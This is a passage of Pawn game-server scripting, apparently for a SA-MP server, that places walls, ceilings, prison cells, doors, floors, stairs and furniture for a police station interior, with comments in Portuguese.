	ParedesGeralDp1[77] = CreateDynamicObjectEx(19404,1556.5316200,-1658.9544700,16.9881600,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[78] = CreateDynamicObjectEx(19450,1556.5146500,-1652.5776400,16.9819000,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[79] = CreateDynamicObjectEx(19450,1561.2727100,-1651.8695100,16.9819000,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[80] = CreateDynamicObjectEx(19450,1570.8579100,-1651.8636500,16.9819000,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[81] = CreateDynamicObjectEx(19404,1574.5671400,-1690.3575400,16.9823000,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[82] = CreateDynamicObjectEx(19450,1573.3339800,-1685.6921400,16.9819000,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[83] = CreateDynamicObjectEx(19450,1573.3255600,-1666.8348400,16.9819000,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[84] = CreateDynamicObjectEx(19450,1573.3205600,-1657.2854000,16.9819000,0.0000000,0.0000000,0.0000000,300.000,300.000); //
	ParedesGeralDp1[85] = CreateDynamicObjectEx(19431,1572.92407,-1657.38440,16.96920,0.00000, 0.00000, 90.00000,300.000,300.000); //
	ParedesGeralDp1[86] = CreateDynamicObjectEx(19431,1570.69641,-1657.36609,18.82920,90.00000, 0.00000, 90.00000,300.000,300.000); //
	ParedesGeralDp1[87] = CreateDynamicObjectEx(19431,1568.38257,-1657.39392,16.96920,0.00000, 0.00000, 90.00000,300.000,300.000); //
	ParedesGeralDp1[88] = CreateDynamicObjectEx(19431,1567.8389900,-1666.1744400,16.9648000,0.0000000,0.0000000,90.0000000,300.000,300.000); //
	ParedesGeralDp1[89] = CreateDynamicObjectEx(19431,1567.8427700,-1668.9946300,16.9648000,0.0000000,0.0000000,90.0000000,300.000,300.000); //

	for(new i = 0; i != 90; i++) SetDynamicObjectMaterial(ParedesGeralDp1[i],0,5886, "garag3_lawn", "bluestucco1", 0xFFFFFFFF);

	portaelevador[0] = CreateObject(18756, 1570.55994, -1655.40735, 17.12820,   0.00000, 0.00000, 90.00000);
	portaelevador[1] = CreateObject(18756, 1568.63159, -1655.41528, 17.12820,   0.00000, 0.00000, 90.00000);

	// Botão elevador
	CreateDynamicObject(2886, 1568.83606, -1657.53174, 16.84570,   0.00000, 0.00000, 0.00000);

	 // TETO //


	TetosGeralDp1[0]= CreateObject(19377, 1572.00574, -1680.73059, 18.79001,   0.00000, 90.00000, 0.00000);
	TetosGeralDp1[1]= CreateObject(19377, 1565.00684, -1675.75122, 18.81000,   0.00000, 90.00000, 0.00000);
	TetosGeralDp1[2]= CreateObject(19377, 1571.84363, -1675.66821, 18.81000,   0.00000, 90.00000, 0.00000);
	for(new i = 0; i != 3; i++) SetObjectMaterial(TetosGeralDp1[i],0, 1786, "cj_tv", "CJ_Black_metal", 0xFF000000);

	TetosGeralDp[0] = CreateDynamicObjectEx(19377,1561.5838600,-1694.9320100,18.7900100,0.0000000,90.0000000,0.0000000,300.000,300.000); //
	TetosGeralDp[1] = CreateDynamicObjectEx(19377,1561.5898400,-1685.3570600,18.7900100,0.0000000,90.0000000,0.0000000,300.000,300.000); //
	TetosGeralDp[2] = CreateDynamicObjectEx(19377,1572.0600600,-1690.3381300,18.7900100,0.0000000,90.0000000,0.0000000,300.000,300.000); //
	TetosGeralDp[3] = CreateDynamicObjectEx(19377,1561.6044900,-1666.9931600,18.7900100,0.0000000,90.0000000,0.0000000,300.000,300.000); //
	TetosGeralDp[4] = CreateDynamicObjectEx(19377,1561.5136700,-1684.2972400,18.8100000,0.0000000,90.0000000,0.0000000,300.000,300.000); //
	TetosGeralDp[5] = CreateDynamicObjectEx(19377,1561.1657700,-1656.9491000,18.7900000,0.0000000,90.0000000,-90.0000000,300.000,300.000); //
	TetosGeralDp[6] = CreateDynamicObjectEx(19377,1571.8413100,-1666.9725300,18.7900100,0.0000000,90.0000000,0.0000000,300.000,300.000); //
	TetosGeralDp[7] = CreateDynamicObjectEx(19377,1570.7246100,-1656.9484900,18.7900000,0.0000000,90.0000000,-90.0000000,300.000,300.000); //
	TetosGeralDp[8] = CreateDynamicObjectEx(19377,1564.5123300,-1692.4006300,18.7700000,0.0000000,90.0000000,0.0000000,300.000,300.000); //
	TetosGeralDp[9] = CreateDynamicObjectEx(19377,1561.5247800,-1667.6197500,24.0027000,0.0000000,90.0000000,0.0000000,300.000,300.000); //
	TetosGeralDp[10] = CreateDynamicObjectEx(19377,1561.5053700,-1657.9926800,24.0027000,0.0000000,90.0000000,0.0000000,300.000,300.000); //
	TetosGeralDp[11] = CreateDynamicObjectEx(19377,1571.8679200,-1665.3712200,24.0027000,0.0000000,90.0000000,0.0000000,300.000,300.000); //
	TetosGeralDp[12] = CreateDynamicObjectEx(19377,1571.1318400,-1655.8018800,24.0027000,0.0000000,90.0000000,0.0000000,300.000,300.000); //
	TetosGeralDp[13] = CreateDynamicObjectEx(19377,1561.5778800,-1677.2491500,24.0027000,0.0000000,90.0000000,0.0000000,300.000,300.000); //
	TetosGeralDp[14] = CreateDynamicObjectEx(19377,1571.9139400,-1674.9715600,24.0027000,0.0000000,90.0000000,0.0000000,300.000,300.000); //
	TetosGeralDp[15] = CreateDynamicObjectEx(19377,1561.5717800,-1694.9763200,22.6006000,0.0000000,90.0000000,0.0000000,300.000,300.000); //
	TetosGeralDp[16] = CreateDynamicObjectEx(19377,1571.8886700,-1694.9826700,22.6006000,0.0000000,90.0000000,0.0000000,300.000,300.000); //
	TetosGeralDp[17] = CreateDynamicObjectEx(19377,1561.5582300,-1686.7706300,22.6006000,0.0000000,90.0000000,0.0000000,300.000,300.000); //
	TetosGeralDp[18] = CreateDynamicObjectEx(19377,1569.5419900,-1685.3786600,22.6206000,0.0000000,90.0000000,0.0000000,300.000,300.000); //
	TetosGeralDp[19] = CreateDynamicObjectEx(19454,1569.1053500,-1681.3522900,22.6139500,0.0000000,90.0000000,90.0000000,300.000,300.000); //
	TetosGeralDp[20] = CreateDynamicObjectEx(19454,1561.1274400,-1682.0394300,24.4174800,0.0000000,90.0000000,90.0000000,300.000,300.000); //
	TetosGeralDp[21] = CreateDynamicObjectEx(19454,1561.0783700,-1651.6250000,23.9922700,0.0000000,90.0000000,90.0000000,300.000,300.000);//

	for(new i = 0; i != 22; i++) SetDynamicObjectMaterial(TetosGeralDp[i], 0, 1786, "cj_tv", "CJ_Black_metal", 0xFF000000);



	// PAREDES TIJOLOS PRISAO //

	CreateDynamicObject(19377, 1563.50342, -1657.82532, 3.98000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19377, 1577.71143, -1657.86475, 3.98000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(18981, 1580.09924, -1665.57581, 1.04321,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18981, 1559.39368, -1665.45667, 1.04321,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19377, 1571.91467, -1652.10547, 3.98000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19377, 1572.97766, -1653.08411, 3.98000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19377, 1568.25134, -1653.12842, 3.98000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19377, 1568.55103, -1657.44666, 9.88000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19377, 1573.01794, -1652.54590, 13.54000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19377, 1571.65393, -1651.12109, 13.52000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19377, 1568.14490, -1652.53479, 13.52000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19357, 1570.14075, -1658.76733, 4.60000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19357, 1571.34180, -1658.76611, 4.58000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(2949, 1579.56494, -1662.35413, 0.9000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19377, 1570.16833, -1652.96069, 0.92070,   0.00000, 90.00000, 0.00000);


	//Paredes celas//

	CreateObject(19456, 1559.85840, -1674.29810, 2.82000,   0.00000, 0.00000, 0.00000);
	CreateObject(19456, 1575.67554, -1674.04761, 6.56260,   0.00000, 0.00000, 0.00000);
	CreateObject(19456, 1571.73999, -1674.21570, 6.56260,   0.00000, 0.00000, 0.00000);
	CreateObject(19456, 1579.61804, -1674.25415, 6.56260,   0.00000, 0.00000, 0.00000);
	CreateObject(19456, 1575.70276, -1675.84387, 6.56260,   0.00000, 0.00000, 90.00000);
	CreateObject(19456, 1567.85364, -1674.09839, 6.56260,   0.00000, 0.00000, 0.00000);
	CreateObject(19456, 1563.97363, -1674.21082, 6.52260,   0.00000, 0.00000, 0.00000);
	CreateObject(19456, 1560.06506, -1674.26367, 6.56260,   0.00000, 0.00000, 0.00000);
	CreateObject(19456, 1566.07898, -1675.90234, 6.56260,   0.00000, 0.00000, 90.00000);
	CreateObject(19456, 1561.66736, -1675.88062, 6.56260,   0.00000, 0.00000, 90.00000);
	CreateObject(19456, 1567.85364, -1674.09839, 2.82000,   0.00000, 0.00000, 0.00000);
	CreateObject(19456, 1571.54175, -1674.12024, 2.82000,   0.00000, 0.00000, 0.00000);
	CreateObject(19456, 1575.58252, -1674.20593, 2.82000,   0.00000, 0.00000, 0.00000);
	CreateObject(19456, 1575.58252, -1674.20593, 2.82000,   0.00000, 0.00000, 0.00000);
	CreateObject(19456, 1579.62732, -1674.19507, 2.82000,   0.00000, 0.00000, 0.00000);
	CreateObject(19456, 1575.20288, -1675.61548, 2.82000,   0.00000, 0.00000, 90.00000);
	CreateObject(19456, 1565.80237, -1675.59216, 2.82000,   0.00000, 0.00000, 90.00000);
	CreateObject(19456, 1563.89697, -1675.60522, 2.82000,   0.00000, 0.00000, 90.00000);
	CreateObject(19456, 1563.60938, -1674.15930, 2.82000,   0.00000, 0.00000, 0.00000);


	//piso de madeira //


	CreateObject(19379, 1561.63721, -1675.71130, 15.16455,   0.00000, 90.00000, 0.00000);
	CreateObject(19379, 1572.07117, -1675.67004, 15.16455,   0.00000, 90.00000, 0.00000);




	//teto e chao prisão cor padrao //

	CreateObject(19377, 1564.52527, -1671.63525, 4.72070,   0.00000, 90.00000, 0.00000);
	CreateObject(19377, 1564.62854, -1671.52295, 0.96070,   0.00000, 90.00000, 0.00000);
	CreateObject(19377, 1575.07544, -1671.50403, 0.96070,   0.00000, 90.00000, 0.00000);
	CreateObject(19377, 1575.16589, -1671.59900, 8.38070,   0.00000, 90.00000, 0.00000);
	CreateObject(19377, 1564.67993, -1671.60229, 8.38070,   0.00000, 90.00000, 0.00000);
	CreateObject(19377, 1575.03186, -1671.62305, 4.72070,   0.00000, 90.00000, 0.00000);




	// Celas//


	CreateObject(14437, 1561.64539, -1685.43933, 2.80400,   0.00000, 0.00000, 0.00000);
	CreateObject(14437, 1565.57678, -1685.46606, 2.80400,   0.00000, 0.00000, 0.00000);
	CreateObject(14437, 1569.56665, -1685.47864, 2.80400,   0.00000, 0.00000, 0.00000);
	CreateObject(14437, 1573.51062, -1685.44031, 2.80400,   0.00000, 0.00000, 0.00000);
	CreateObject(14437, 1577.49036, -1685.44067, 2.80400,   0.00000, 0.00000, 0.00000);
	CreateObject(14437, 1561.91370, -1685.43933, 6.78400,   0.00000, 0.00000, 0.00000);
	CreateObject(14437, 1565.84241, -1685.44324, 6.80400,   0.00000, 0.00000, 0.00000);
	CreateObject(14437, 1569.78809, -1685.44055, 6.80400,   0.00000, 0.00000, 0.00000);
	CreateObject(14437, 1573.75305, -1685.41699, 6.80400,   0.00000, 0.00000, 0.00000);
	CreateObject(14437, 1577.69336, -1685.43018, 6.80400,   0.00000, 0.00000, 0.00000);


	// portas das celas //


	celas[0] = CreateObject(2930, 1560.83679, -1669.16003, 3.47870,   0.00000, 0.00000, 90.00000);
	celas[1] = CreateObject(2930, 1564.82568, -1669.21387, 3.47870,   0.00000, 0.00000, 90.00000);
	celas[2] = CreateObject(2930, 1568.75757, -1669.22327, 3.47870,   0.00000, 0.00000, 90.00000);
	celas[3] = CreateObject(2930, 1572.67529, -1669.17993, 3.47870,   0.00000, 0.00000, 90.00000);
	celas[4] = CreateObject(2930, 1576.65149, -1669.19653, 3.47870,   0.00000, 0.00000, 90.00000);
	celas[5] = CreateObject(2930, 1576.86096, -1669.15967, 7.38000,   0.00000, 0.00000, 90.00000);
	celas[6] = CreateObject(2930, 1572.92981, -1669.19897, 7.38000,   0.00000, 0.00000, 90.00000);
	celas[7] = CreateObject(2930, 1568.94568, -1669.16846, 7.38000,   0.00000, 0.00000, 90.00000);
	celas[8] = CreateObject(2930, 1564.92993, -1669.20435, 7.38000,   0.00000, 0.00000, 90.00000);
	celas[9] = CreateObject(2930, 1561.06873, -1669.19714, 7.38000,   0.00000, 0.00000, 90.00000);




	//resto dos objetos //

	CreateDynamicObject(1491, 1561.56140, -1679.52356, 15.23260,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2423, 1569.05042, -1673.26697, 15.21422,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2424, 1568.96423, -1676.12805, 15.21422,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2424, 1568.96533, -1675.21045, 15.21422,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2424, 1568.95508, -1677.04675, 15.21422,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2423, 1568.95679, -1677.96118, 15.21420,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2424, 1569.97205, -1673.27563, 15.21420,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2424, 1569.99036, -1678.03430, 15.21420,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2424, 1568.97656, -1674.28418, 15.21422,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1491, 1561.36389, -1671.78113, 15.23260,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2202, 1572.71716, -1678.09595, 15.22940,   0.00000, 0.00000, -90.76000);
	CreateDynamicObject(2190, 1568.72278, -1676.86060, 16.26820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1714, 1570.27991, -1676.59949, 15.23495,   0.00000, 0.00000, 280.00000);
	CreateDynamicObject(1714, 1570.31824, -1675.52600, 15.23500,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2007, 1572.74512, -1676.74670, 15.24743,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(2007, 1572.72583, -1675.76660, 15.24743,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1808, 1567.18579, -1671.96545, 15.22897,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1703, 1564.07434, -1672.32715, 15.23939,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1703, 1566.20605, -1678.96179, 15.23940,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2289, 1573.18970, -1675.80273, 17.63398,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2287, 1572.68323, -1673.79114, 17.02540,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2286, 1568.20776, -1671.91370, 17.51823,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2282, 1572.76978, -1677.67444, 17.00896,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2286, 1567.21216, -1679.43091, 17.51820,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1714, 1570.31848, -1674.37708, 15.23500,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1817, 1564.68945, -1676.18335, 15.23161,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2852, 1565.28284, -1675.68701, 15.72310,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2833, 1561.14404, -1676.02112, 15.25690,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2163, 1573.24744, -1673.94861, 15.20744,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2008, 1569.04883, -1676.37720, 15.45827,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2190, 1569.01099, -1673.83655, 16.26820,   0.00000, 0.00000, 20.00000);
	CreateDynamicObject(2253, 1569.98474, -1673.22693, 16.30783,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2253, 1570.01282, -1678.13098, 16.30783,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2828, 1569.35925, -1673.39172, 16.26811,   0.00000, 0.00000, -163.20003);
	CreateDynamicObject(2269, 1559.02808, -1680.12366, 17.25853,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1536, 1559.85547, -1677.09607, 15.25170,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1536, 1559.81714, -1674.10620, 15.25170,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1800, 1562.58398, -1676.46460, 1.04620,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1800, 1566.88391, -1676.46460, 1.04620,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1800, 1570.50354, -1676.46460, 1.04620,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1800, 1574.49268, -1676.46460, 1.04620,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1800, 1578.56494, -1676.46460, 1.04620,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1800, 1578.63477, -1676.45850, 4.80730,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1800, 1574.66748, -1676.64270, 4.80730,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1800, 1570.75708, -1676.80444, 4.80730,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1800, 1566.72852, -1676.78088, 4.80730,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1800, 1562.95227, -1676.77649, 4.80730,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2738, 1560.63623, -1675.06921, 1.60810,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2738, 1564.76660, -1675.09509, 1.60810,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2738, 1568.80762, -1675.09509, 1.60810,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2738, 1572.46179, -1675.09509, 1.60810,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2738, 1576.71411, -1675.09509, 1.60810,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2738, 1576.73047, -1675.35022, 5.38800,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2738, 1572.64990, -1675.35022, 5.38800,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2738, 1568.75684, -1675.35022, 5.38800,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2738, 1564.83667, -1675.34973, 5.38800,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2738, 1560.91235, -1675.35144, 5.38800,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(12950, 1560.45068, -1661.59058, 1.42540,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19387, 1566.92627, -1659.38611, 2.78710,   0.00000, 0.00000, 0.00000);
	portacelas = CreateObject(2930, 1566.94397, -1658.47510, 3.47870,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19357, 1571.28186, -1659.52515, 4.62000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19403, 1571.28528, -1661.02112, 2.78710,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19403, 1568.44434, -1661.02673, 2.78710,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19357, 1568.55212, -1659.51355, 4.60000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(2930, 1567.59814, -1660.94739, 3.63870,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2930, 1570.41980, -1661.00134, 3.63870,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1577.48059, -1666.86108, 5.35300,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1573.31799, -1666.86108, 5.35300,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1573.31799, -1666.86108, 5.35300,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1569.15039, -1666.86108, 5.35300,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1564.98560, -1666.86108, 5.35300,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1562.89429, -1666.87781, 5.35300,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1368, 1572.51208, -1664.81714, 1.40660,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1368, 1575.85974, -1664.88623, 1.42660,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1368, 1569.51843, -1664.89978, 1.40660,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1368, 1566.51331, -1665.00403, 1.40660,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1368, 1563.17334, -1665.24414, 1.40660,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2439, 1576.51123, -1660.62573, 1.04700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2439, 1575.51257, -1660.62378, 1.04700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2439, 1574.52600, -1660.62976, 1.04700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2439, 1573.53845, -1660.63037, 1.04700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19387, 1572.95667, -1659.50586, 2.78710,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2439, 1576.66821, -1660.50195, 1.04700,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2439, 1576.67407, -1659.52039, 1.04700,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2439, 1576.67188, -1658.53711, 1.04700,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2417, 1575.01599, -1658.29944, 1.04768,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2439, 1573.51794, -1660.61255, 3.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2439, 1574.50110, -1660.61255, 3.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2439, 1575.48389, -1660.61011, 3.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2439, 1576.41760, -1660.60815, 3.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2439, 1576.41760, -1660.60815, 3.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2439, 1576.41760, -1660.60815, 3.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2439, 1576.56323, -1660.47021, 3.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2439, 1576.55017, -1658.50842, 3.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2439, 1576.55640, -1659.46973, 3.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19357, 1574.82532, -1659.11072, 3.96000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(1502, 1572.97144, -1660.24695, 1.04900,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 1573.45032, -1664.77759, 1.32140,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 1576.89087, -1664.85486, 1.32140,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 1570.58301, -1664.82971, 1.32140,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2637, 1567.74609, -1664.82349, 1.32140,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2674, 1573.42883, -1664.92627, 1.80530,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2675, 1574.96545, -1662.38049, 1.09000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2677, 1570.84473, -1662.62158, 1.32725,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2677, 1579.25134, -1664.90222, 1.32725,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2417, 1575.97339, -1658.29358, 1.04768,   0.00000, 0.00000, 0.00000);



	// Piso //

	CreateDynamicObject(19379,1561.6460000,-1666.1273200,15.1645500,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1561.7147200,-1656.5727500,15.1645500,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1561.6389200,-1685.3145800,15.1645500,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1561.6450200,-1694.8754900,15.1645500,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1572.1846900,-1662.1041300,15.1445000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1572.0996100,-1666.0703100,15.1645500,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1572.1221900,-1685.2443800,15.1645500,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1572.0728800,-1694.8754900,15.1645500,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1561.5811800,-1694.9303000,18.9496100,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1561.5553000,-1685.3220200,18.9496100,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1571.9143100,-1690.3531500,18.9496100,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1571.8973400,-1680.8123800,18.9496100,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1561.5811800,-1694.9303000,18.9496100,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1561.5553000,-1685.3220200,18.9496100,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1571.9143100,-1690.3531500,18.9496100,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1571.8973400,-1680.8123800,18.9496100,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1561.6132800,-1674.7810100,20.5035300,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1561.6032700,-1665.2265600,20.5035300,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1561.6280500,-1655.6417200,20.5035300,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1571.8538800,-1674.8250700,20.5035300,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1571.9370100,-1665.2036100,20.5035300,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19379,1571.9133300,-1655.5939900,20.5035300,0.0000000,90.0000000,0.0000000); //



	//Cor padrao//

	CreateDynamicObject(19377,1575.1026600,-1661.9080800,0.9607000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,1564.6297600,-1661.9296900,0.9607000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,1563.8155500,-1662.1695600,8.3807000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,1574.2821000,-1662.0677500,8.3807000,0.0000000,90.0000000,0.0000000); //



		//ESCADAS/

	CreateDynamicObject(14395,1569.8116500,-1696.8798800,16.5714800,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(14394,1560.3635300,-1680.7303500,19.7653500,0.0000000,0.0000000,90.0000000); //


	//Resto dos Objetos//

	CreateDynamicObject(1491,1568.2337600,-1664.2380400,20.5895400,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1491,1564.3577900,-1693.4847400,19.0373000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2528,1567.4843800,-1696.4871800,15.2526000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2523,1567.5356400,-1694.8554700,15.2437000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2593,1567.5761700,-1690.5861800,16.0951000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(627,1565.9887700,-1670.7329100,16.9008000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(627,1557.6571000,-1670.9425000,16.9007700,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1337,1567.6309800,-1652.1656500,17.2512000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2374,1572.9360400,-1663.7365700,17.0400600,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2374,1572.9783900,-1664.2612300,17.0400600,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1744,1569.1969000,-1663.1080300,16.1397800,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1744,1571.1300000,-1663.1151100,16.1397800,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1744,1573.3770800,-1666.2569600,16.1398000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2372,1571.8110400,-1670.4246800,15.2189000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2378,1573.0141600,-1664.8145800,17.0266000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2378,1572.9969500,-1665.4752200,17.0266000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2381,1571.1604000,-1670.6477100,15.8916200,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2384,1573.1138900,-1666.2034900,16.5810000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2384,1573.1179200,-1666.7237500,16.5810000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2384,1573.1224400,-1667.2639200,16.5810000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1709,1565.3389900,-1652.3949000,15.2811000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1827,1562.9194300,-1654.8219000,15.1603700,0.0000000,0.0000000,0.0000000); //
